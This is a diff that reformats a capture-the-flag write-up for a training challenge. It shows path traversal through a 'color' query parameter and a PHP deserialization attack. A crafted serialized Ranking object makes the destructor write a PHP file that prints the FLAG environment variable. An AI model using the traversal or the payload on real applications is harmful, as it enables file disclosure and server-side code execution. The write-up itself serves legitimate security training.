@@ -16,13 +16,15 @@ notice that you can retrieve the php files thought a path traversal:
 - Finally, if it is printed, go to  http://1024.training.jinblack.it/games/hello3.php
 
 
-Read the env variable FLAG.
+## Challange
+Read the env variable `FLAG`.
+## Solution
+Using this link `http://1024.training.jinblack.it/?color=blue.css` by altering the `color` parameter is possible to perform path traversal and read all the files, like: `http://1024.training.jinblack.it/?color=../index.php`.
 
-Solution
-Using this link http://1024.training.jinblack.it/?color=blue.css by altering the color parameter is possible to perform path traversal and read all the files, like: http://1024.training.jinblack.it/?color=../index.php.
+In the page `http://1024.training.jinblack.it/?color=../viewer.php` is performed an unserialization of the uploaded file.
+By checking `innerGame.php` (which is included in viewer) we can see the `Ranking` class.
 
-In the page http://1024.training.jinblack.it/?color=../viewer.php is performed an unserialization of the uploaded file. By checking innerGame.php (which is included in viewer) we can see the Ranking class.
-
+```php
     <?php
 // ini_set('display_errors', 1);
 // ini_set('display_startup_errors', 1);
@@ -257,7 +259,12 @@ class Game{
   }
 }
 ?> 
-In the __destruct of the Ranking class a file is created if changed is true. The content of the file is the ranking variable. If we craft the object to upload in this way:
+```
+In the `__destruct` of the `Ranking` class a file is created if `changed` is true. The content of the file is the `ranking` variable.
+If we craft the object to upload in this way:
 
+```
 O:7:"Ranking":3:{s:7:"ranking";s:28:"<?php echo $_ENV['FLAG']; ?>";s:7:"changed";b:1;s:4:"path";s:15:"./games/env.php";}
-We can create a file called env.php. To do so, after the fake replay as been uploaded, we uploaded it another time so the previous reference is lost and the destruct is called, creating the file. By visiting http://1024.training.jinblack.it/games/env.php we obtain the flag.
+```
+We can create a file called `env.php`. To do so, after the fake replay as been uploaded, we uploaded it another time so the previous reference is lost and the destruct is called, creating the file.
+By visiting `http://1024.training.jinblack.it/games/env.php` we obtain the flag. 
